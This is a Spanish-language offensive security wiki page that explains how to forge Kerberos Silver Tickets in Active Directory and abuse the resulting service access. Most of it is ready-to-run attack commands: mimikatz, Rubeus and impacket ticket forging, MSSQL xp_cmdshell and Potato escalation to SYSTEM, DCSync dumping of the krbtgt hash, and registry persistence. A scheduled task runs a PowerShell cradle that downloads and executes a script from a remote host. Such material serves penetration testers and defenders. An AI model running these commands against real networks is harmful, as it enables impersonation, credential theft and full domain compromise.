# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

El **Silver Ticket** attack implica la explotación de service tickets en entornos de Active Directory (AD). Este método se basa en **adquirir el NTLM hash de una cuenta de servicio**, como una cuenta de equipo, para forjar un Ticket Granting Service (TGS) ticket. Con este ticket forjado, un atacante puede acceder a servicios específicos en la red, **suplantando a cualquier usuario**, normalmente con el objetivo de obtener privilegios administrativos. Se enfatiza que usar AES keys para forjar tickets es más seguro y menos detectable.

> [!WARNING]
> Silver Tickets son menos detectables que Golden Tickets porque solo requieren el **hash de la cuenta de servicio**, no la cuenta krbtgt. Sin embargo, están limitados al servicio específico al que apuntan. Además, simplemente robar la contraseña de un usuario.
> Además, si comprometes la **contraseña de una cuenta con un SPN** puedes usar esa contraseña para crear un Silver Ticket suplantando a cualquier usuario ante ese servicio.

Para la creación de tickets, se emplean diferentes herramientas según el sistema operativo:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### En Windows
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
El servicio CIFS se destaca como un objetivo común para acceder al sistema de archivos de la víctima, pero otros servicios como HOST y RPCSS también pueden explotarse para tareas y consultas WMI.

### Ejemplo: servicio MSSQL (MSSQLSvc) + Potato a SYSTEM

Si tienes el hash NTLM (o la clave AES) de una cuenta de servicio SQL (p. ej., sqlsvc) puedes forjar un TGS para el SPN MSSQL y suplantar a cualquier usuario ante el servicio SQL. Desde allí, habilita xp_cmdshell para ejecutar comandos como la cuenta de servicio SQL. Si ese token tiene SeImpersonatePrivilege, encadena un Potato para elevar a SYSTEM.
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Si el contexto resultante tiene SeImpersonatePrivilege (a menudo cierto para service accounts), usa una variante de Potato para obtener SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Más detalles sobre el abuso de MSSQL y la habilitación de xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Resumen de Potato techniques:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Servicios disponibles

| Service Type                               | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Dependiendo del sistema operativo también:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>En algunas ocasiones puedes simplemente solicitar: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Usando **Rubeus** puedes **solicitar** todos estos tickets usando el parámetro:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624: Inicio de sesión de cuenta
- 4634: Cierre de sesión de cuenta
- 4672: Inicio de sesión de administrador

## Persistencia

Para evitar que las máquinas roten su contraseña cada 30 días establece `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` o puedes establecer `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` a un valor mayor que 30days para indicar el período de rotación cuando la contraseña de las máquinas debería rotarse.

## Abusing Service tickets

En los siguientes ejemplos imaginemos que el ticket se obtiene suplantando la cuenta de administrador.

### CIFS

Con este ticket podrás acceder a las carpetas `C$` y `ADMIN$` vía **SMB** (si están expuestas) y copiar archivos a una parte del sistema de archivos remoto simplemente haciendo algo como:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
También podrás obtener una shell dentro del host o ejecutar comandos arbitrarios usando **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Con este permiso puedes generar tareas programadas en equipos remotos y ejecutar comandos arbitrarios:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Con estos tickets puedes **ejecutar WMI en el sistema de la víctima**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Encuentra **más información sobre wmiexec** en la siguiente página:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Con acceso winrm a un equipo puedes **acceder a él** e incluso obtener un PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Check the following page to learn **more ways to connect with a remote host using winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Ten en cuenta que **winrm debe estar activo y escuchando** en el equipo remoto para poder acceder a él.

### LDAP

Con este privilegio puedes volcar la base de datos del DC usando **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Aprende más sobre DCSync** en la siguiente página:


{{#ref}}
dcsync.md
{{#endref}}


## Referencias

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
